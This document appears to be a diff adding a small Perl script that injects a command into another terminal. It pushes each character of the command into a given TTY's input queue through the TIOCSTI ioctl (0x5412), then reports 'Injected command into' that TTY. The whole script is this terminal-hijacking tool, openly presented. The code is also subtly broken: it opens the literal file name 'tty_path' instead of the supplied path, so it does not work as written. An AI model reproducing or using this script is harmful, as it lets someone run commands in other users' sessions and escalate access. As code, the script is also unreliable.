@@ -1,0 +1,19 @@
+#!/usr/bin/env perl
+
+use strict;
+use warnings;
+
+my $tty_path = $ARGV[0] or die "Provide a TTY\n";
+my $command = $ARGV[1] or die "Provide a Command\n";
+
+open(my $tty_fh, ">", "tty_path") or die "Cannot open $tty_path: $!\n";
+
+for my $char (split //, $command) {
+    # ioctl($tty_fh, &TIOCSTI, $char) or die "ioctl failed: $!\n";
+    ioctl($tty_fh, 0x5412, $char) or die "ioctl failed: $!\n";
+}
+
+close($tty_fh);
+print "Injected command into $tty_path!\n";
+
+
